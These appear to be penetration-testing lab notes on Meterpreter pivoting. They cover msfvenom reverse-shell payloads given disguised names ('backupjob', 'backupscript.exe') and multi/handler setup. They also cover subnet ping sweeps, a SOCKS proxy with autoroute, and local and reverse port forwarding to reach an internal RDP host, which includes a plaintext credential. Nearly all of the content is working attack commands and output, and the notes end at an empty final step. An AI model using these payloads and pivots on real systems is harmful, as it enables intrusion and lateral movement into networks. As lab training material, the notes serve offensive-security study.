![Screenshot_3](https://github.com/kiro6/penetration-testing-notes/assets/57776872/139f0117-4f36-436d-b4e2-29a9a58f1cec)


## Meterpreter Tunneling & dynamic port forwardiing 

### Creating Payload for Ubuntu Pivot Host

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```

### Configuring & Starting the multi/handler
```shell
use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

### Executing the Payload on the Pivot Host
```
 ./backupjob
```
### Ping Sweep
```shell
# msfconsole
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23          

# shell
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done    

# CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

### conf check proxychain 
```
cat /etc/proxychains.conf

socks4 	127.0.0.1 9050

```

### Configuring MSF's SOCKS Proxy
This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
```shell
sf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

### Confirming Proxy Server is Running
```shell
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

### Creating Routes with AutoRoute
Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. 
```shell
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed


or


meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

### Testing Proxy & Routing Functionality
```shell
$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```


## Meterpreter static Port Forwarding

### Creating Local TCP Relay
The command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session.
```shell
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
### use rdp
```shell
$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

### Netstat Output
```shell
$ netstat -antp

tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
```


## Meterpreter Reverse Port Forwarding

### Reverse Port Forwarding Rules
This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081.
```shell
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

### Configuring & Starting multi/handler
```shell
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

```

### Generating the Windows Payload

```shell
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

### run the script in the windows machine
